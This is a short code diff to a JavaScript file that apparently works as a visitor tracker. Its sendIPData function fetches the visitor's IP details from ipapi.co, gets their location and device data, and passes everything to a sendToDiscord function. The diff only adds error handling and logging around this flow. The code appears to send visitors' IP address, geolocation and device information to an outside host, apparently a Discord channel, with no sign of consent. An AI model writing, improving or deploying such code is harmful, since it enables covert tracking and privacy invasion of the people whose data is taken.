@@ -84,14 +84,22 @@ function getUserLocation(callback) {
 
 function sendIPData() {
   fetch("https://ipapi.co/json")
-    .then((response) => response.json())
+    .then((response) => {
+      if (!response.ok) {
+        throw new Error(`IP API error: ${response.statusText}`);
+      }
+      return response.json();
+    })
     .then((ipData) => {
       getUserLocation(function (locationData) {
-        const deviceData = getDeviceData(); // Get device data
-        sendToDiscord(ipData, locationData, deviceData); // Pass device data
+        const deviceData = getDeviceData();
+        console.log("Device Data:", deviceData);
+        sendToDiscord(ipData, locationData, deviceData);
       });
     })
-    .catch((error) => console.error(`Error retrieving IP data: ${error}`));
+    .catch((error) => {
+      console.error(`Error retrieving IP data: ${error}`);
+    });
 }
 
 function getDeviceData() {
